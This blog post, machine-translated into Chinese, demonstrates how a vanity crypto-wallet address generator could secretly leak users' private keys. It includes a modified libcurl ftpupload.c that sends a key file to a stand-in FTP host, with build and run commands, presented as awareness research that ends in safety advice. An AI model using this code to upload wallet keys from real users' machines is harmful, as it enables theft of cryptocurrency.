<!-- wp:embed {"url":"https://www.youtube.com/embed/sB91EE-1mJo","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/sB91EE-1mJo
</div></figure>
<!-- /wp:embed -->

<!-- wp:paragraph -->
<p>多年來，加密社區形成了一個完整的邪教組織，旨在為加密錢包創建漂亮的地址。每個人都可以為自己生成一個“漂亮”的地址，這個地址不僅是獨一無二的，而且還會包含一定的字母和數字組合。這是一個非常令人興奮和有趣的過程，但不能完全排除涉及第三方和攔截加密錢包私鑰的風險。我們都聽說過獨立聚合器<code>CoinMarketCap</code>，<code>CoinGecko</code>它們是最流行的跟踪證券交易所價格的平台，但在本文中我們不會考慮這些站點的機制和功能。我們將討論<code>vanitygen</code>+中的隱藏代碼<code>oclvanitygen</code>及其在熱門網站上的快速傳播。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>這是一個為信息安全目的而創建的研究項目。</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>許多用戶對標準的隨機加密錢包地址不滿意，因此他們使用各種<em>程序、實用程序和插件</em>來創建漂亮的加密貨幣地址。</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://www.tadviser.ru/index.php/%D0%A1%D1%82%D0%B0%D1%82%D1%8C%D1%8F:%D0%9C%D0%BE%D1%88%D0%B5%D0%BD%D0%BD%D0%B8%D1%87%D0%B5%D1%81%D1%82%D0%B2%D0%BE_%D1%81_%D0%BA%D1%80%D0%B8%D0%BF%D1%82%D0%BE%D0%B2%D0%B0%D0%BB%D1%8E%D1%82%D0%BE%D0%B9" target="_blank" rel="noreferrer noopener"><strong><u>據TAdviser</u></strong></a>門戶網站稱，由於使用未經驗證的軟件，受害者越來越多地成為受害者。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><code>Coingecko-VanityGen</code>是一個命令行實用程序，能夠根據給定的初始參數生成加密貨幣地址。</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/34e/412/42d/34e41242d6925aff32d0d72314b5a6ab.gif" alt="用於創建個性化地址的源代碼“Coingecko-VanityGen”。" title="用於創建個性化地址的源代碼“Coingecko-VanityGen”。"/><figcaption class="wp-element-caption">用於創建個性化地址的源代碼“Coingecko-VanityGen”。</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>實用程序的選擇基於概率搜索，這需要一些時間。<br>時間取決於給定圖案的複雜程度、計算機速度和運氣。為了提高生成加密貨幣地址的速度，有一種<code>oclvanitygen</code>使用<code>OpenCL</code>兼容<code>GPU</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>在我們的許多研究中，我們使用<code>Google Colab</code>並且為了我們自己的審查，我們將解析<a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>12CoingeckoAgentFtpupload</strong></a>存儲庫中的<a href="https://github.com/demining/CryptoDeepTools/blob/main/12CoingeckoAgentFtpupload/Coingecko_VanityGen.ipynb" target="_blank" rel="noreferrer noopener"><strong>Coingecko-VanityGen文件</strong></a><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/c31/270/e17/c31270e17066e23df3a85dcf9201ec11.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/blob/main/12CoingeckoAgentFtpupload/Coingecko_VanityGen.ipynb" target="_blank" rel="noreferrer noopener"><strong>Coingecko-VanityGen</strong></a><em>與GPU</em>&nbsp;運行時支持一起工作<code>(Google Colab)</code>，並根據自己的參數為完整的聚合器列表生成漂亮的加密錢包地址<code>Coingecko</code>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>如何保存私鑰？</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4>為了理解和理解，我們將繼續進行實驗部分：</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>打開&nbsp;<a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener"><strong>[TerminalGoogleColab]</strong></a>。</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>讓我們使用“12CoingeckoAgentFtpupload”</strong></a>存儲庫。</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/12CoingeckoAgentFtpupload/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/2c8/a04/acb/2c8a04acb83af8dbc6ab3cd8345d76ca.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>更新並安裝 g++ libgmp3-dev libmpfr-dev</h4>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>apt-get update

sudo apt-get install g++ -y

sudo apt-get install libgmp3-dev libmpfr-dev -y
</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/12c/340/f1b/12c340f1b2a7b2efbefb1a56992bc088.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>集會：</h3>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>make</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/473/2a2/998/4732a29981ca60c43d3b3ffa72b0070a.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>讓我們運行命令：<code>ls</code>我們看到它<code>coingeckogen</code>創建成功了！</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/536/dbd/98f/536dbd98fdb65d09d385edb6a189b243.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>運行 LIST 並檢查來自 CoinGecko 聚合器的所有現有加密貨幣</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./coingeckogen -C LIST</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/71c/19e/cc1/71c19ecc127df91b9699a36912163241.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/6cc/0b9/4da/6cc0b94da08c62b232bd8b834a3c961e.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/996/e38/fb3/996e38fb3056196aae14f10891073759.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>運行“coingeckogen”並生成一個帶有“1DEEP”前綴的比特幣地址：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./coingeckogen 1DEEP</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/c29/ced/317/c29ced31748d6f781e880ba78944402b.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Pattern: 1DEEP
Address: 1DEEPQxozZXeUmuVZxKb7JjHq28DhX99AG
Privkey: 5JdG1jvsDgHrS8E8NpRLabzrA1tCbR6ePp9zvv1q1dV6efpSqMH
crypto &gt; </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>讓我們打開&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a>&nbsp;</strong>並檢查：</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/c56/1ed/051/c561ed0511d29e5195c4178485704918.png" alt="位地址" title="位地址"/><figcaption class="wp-element-caption">位地址</figcaption></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>為什麼編譯後的程序可以洩露私鑰？</h2>
<!-- /wp:heading -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/0ec/d35/2b7/0ecd352b7014684d9a22de6b041033c4.png" alt="www.securitylab.ru/news/531888.php" title="www.securitylab.ru/news/531888.php"/><figcaption class="wp-element-caption">www.securitylab.ru/news/531888.php</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.securitylab.ru/news/531888.php" target="_blank" rel="noreferrer noopener"><strong>您可以在信息門戶SecurityLab</strong></a>中閱讀文章<a href="https://www.securitylab.ru/news/531888.php" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3>可以在程序的源代碼中縫入一個密碼：</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>注意<a href="https://curl.se/libcurl/c/ftpupload.html" target="_blank" rel="noreferrer noopener"><strong>ftpupload.c代碼</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><a href="https://linuxcookbook.ru/articles/komanda-curl-linux#:~:text=%D0%9A%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0%20curl%20%D0%B2%20Linux&amp;text=%D0%9A%D0%BE%D0%BC%D0%B0%D0%BD%D0%B4%D0%B0%20curl%20%D0%BF%D1%80%D0%B5%D0%B4%D0%BD%D0%B0%D0%B7%D0%BD%D0%B0%D1%87%D0%B5%D0%BD%D0%B0%20%D0%B4%D0%BB%D1%8F%20%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B8,%D0%BF%D1%80%D0%BE%D1%82%D0%BE%D0%BA%D0%BE%D0%BB%D0%BE%D0%B2%20%D0%B8%20%D0%B5%D1%91%20%D0%B2%D0%BE%D0%B7%D0%BC%D0%BE%D0%B6%D0%BD%D0%BE%D1%81%D1%82%D0%B8%20%D0%BE%D0%B3%D1%80%D0%BE%D0%BC%D0%BD%D1%8B." target="_blank" rel="noreferrer noopener"><strong>cURL</strong>&nbsp;</a>是一個跨平台的命令行實用程序，它允許您使用語法通過許多不同的協議與許多不同的服務器進行交互<code>URL</code>。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>此代碼可以將私鑰發送給<code>FTP - сервер</code>&nbsp;<em>攻擊者</em></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ &lt;| |___
 *                             \___|\___/|_| \_\_____|
 *
 * Copyright (C) 1998 - 2022, Daniel Stenberg, &lt;daniel@haxx.se&gt;, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution. The terms
 * are also available at https://curl.se/docs/copyright.html.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 * SPDX-License-Identifier: curl
 *
 ***************************************************************************/
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
 
#include &lt;curl/curl.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#ifdef WIN32
#include &lt;io.h&gt;
#else
#include &lt;unistd.h&gt;
#endif
 
/* &lt;DESC&gt;
 * Performs an FTP upload and renames the file just after a successful
 * transfer.
 * &lt;/DESC&gt;
 */
 
#define LOCAL_FILE      "/tmp/Result.txt"
#define UPLOAD_FILE_AS  "Result.txt"
#define REMOTE_URL      "ftp://example.com/"  UPLOAD_FILE_AS
#define RENAME_FILE_TO  "private-key-delivered.txt"
 
/* NOTE: if you want this example to work on Windows with libcurl as a
   DLL, you MUST also provide a read callback with CURLOPT_READFUNCTION.
   Failing to do so will give you a crash since a DLL may not use the
   variable's memory when passed in to it from an app like this. */
static size_t read_callback(char *ptr, size_t size, size_t nmemb, void *stream)
{
  unsigned long nread;
  /* in real-world cases, this would probably get this data differently
     as this fread() stuff is exactly what the library already would do
     by default internally */
  size_t retcode = fread(ptr, size, nmemb, stream);
 
  if(retcode &gt; 0) {
    nread = (unsigned long)retcode;
    fprintf(stderr, "*** We read %lu bytes from file\n", nread);
  }
 
  return retcode;
}
 
int main(void)
{
  CURL *curl;
  CURLcode res;
  FILE *hd_src;
  struct stat file_info;
  unsigned long fsize;
 
  struct curl_slist *headerlist = NULL;
  static const char buf_1 &#91;] = "RNFR " UPLOAD_FILE_AS;
  static const char buf_2 &#91;] = "RNTO " RENAME_FILE_TO;
 
  /* get the file size of the local file */
  if(stat(LOCAL_FILE, &amp;file_info)) {
    printf("Couldn't open '%s': %s\n", LOCAL_FILE, strerror(errno));
    return 1;
  }
  fsize = (unsigned long)file_info.st_size;
 
  printf("Local file size: %lu bytes.\n", fsize);
 
  /* get a FILE * of the same file */
  hd_src = fopen(LOCAL_FILE, "rb");
 
  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);
 
  /* get a curl handle */
  curl = curl_easy_init();
  if(curl) {
    /* build a list of commands to pass to libcurl */
    headerlist = curl_slist_append(headerlist, buf_1);
    headerlist = curl_slist_append(headerlist, buf_2);
 
    /* we want to use our own read function */
    curl_easy_setopt(curl, CURLOPT_READFUNCTION, read_callback);
 
    /* enable uploading */
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
 
    /* specify target */
    curl_easy_setopt(curl, CURLOPT_URL, REMOTE_URL);
 
    /* pass in that last of FTP commands to run after the transfer */
    curl_easy_setopt(curl, CURLOPT_POSTQUOTE, headerlist);
 
    /* now specify which file to upload */
    curl_easy_setopt(curl, CURLOPT_READDATA, hd_src);
 
    /* Set the size of the file to upload (optional).  If you give a *_LARGE
       option you MUST make sure that the type of the passed-in argument is a
       curl_off_t. If you use CURLOPT_INFILESIZE (without _LARGE) you must
       make sure that to pass in a type 'long' argument. */
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE,
                     (curl_off_t)fsize);
 
    /* Now run off and do what you have been told! */
    res = curl_easy_perform(curl);
    /* Check for errors */
    if(res != CURLE_OK)
      fprintf(stderr, "curl_easy_perform() failed: %s\n",
              curl_easy_strerror(res));
 
    /* clean up the FTP commands list */
    curl_slist_free_all(headerlist);
 
    /* always cleanup */
    curl_easy_cleanup(curl);
  }
  fclose(hd_src); /* close the local file */
 
  curl_global_cleanup();
  return 0;
}</code></pre>
<!-- /wp:code -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>為了進行測試，將</strong>&nbsp;<a href="https://curl.se/libcurl/c/ftpupload.html" target="_blank" rel="noreferrer noopener"><strong>ftpupload.c</strong></a><strong>文件上傳到</strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong>“12CoingeckoAgentFtpupload”目錄</strong></a></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading -->
<h2>編譯代理Ftpupload：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>gcc -o agentftpupload ftpupload.c -lcurl</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/f38/092/092/f380920921ca4e9c07f12229c570cf8a.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>訪問權限：</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>chmod +x agentftpupload</code></pre>
<!-- /wp:code -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/565/fc6/324/565fc6324d29d9107f0e33be842f2088.png" alt="Coingecko 和 Agent Ftpupload 創建漂亮的加密錢包地址，但要確保私鑰安全"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./agentftpupload</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3>截取私鑰的過程：</h3>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>正如我們上面所說，為了理解私鑰是如何被攔截的，讓我們一步一步地運行<a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><em><u>源代碼</u></em></a>中的所有命令。為此，我們將創建一個帶有“cryptodeeptech”目錄的測試服務器：</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://habrastorage.org/getpro/habr/upload_files/741/668/34f/74166834fa8f6d6dc59f0ca2cc8bed1b.gif" alt="截取私鑰的過程" title="截取私鑰的過程"/><figcaption class="wp-element-caption">截取私鑰的過程</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>從演示示例中可以看出，以下文件已上傳到測試服務器：private-key-delivered.txt</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><code>private-key-delivered.txt</code>- 這是一個包含軟件用戶私鑰的文件。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p><em>整個過程對用戶是隱藏的</em>。</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>我們強烈推薦：</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>只使用經過驗證的軟件；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>查看源代碼；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>自己組裝；</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>進行更新；</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>該視頻是為&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener"><strong>CRYPTO DEEP TECH</strong></a>門戶網站創建的&nbsp;，以確保橢圓曲線上的數據和密碼學的金融安全性&nbsp;免受&nbsp;加密貨幣中&nbsp;<code>secp256k1</code>&nbsp;弱簽名的影響&nbsp;<code>ECDSA</code><code>BITCOIN</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/12CoingeckoAgentFtpupload" target="_blank" rel="noreferrer noopener"><strong><u>來源</u></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://t.me/cryptodeeptech"><strong>電報</strong></a><strong>：&nbsp; https:&nbsp;</strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"><strong><u>//t.me/cryptodeeptech</u></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/sB91EE-1mJo" target="_blank" rel="noreferrer noopener">視頻素材：https://youtu.be/sB91EE-1mJo</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://cryptodeep.ru/coingecko-agent-ftpupload" target="_blank" rel="noreferrer noopener"><strong>資料來源：https://cryptodeep.ru/coingecko-agent-ftpupload</strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">密碼分析</a></p>
<!-- /wp:paragraph -->
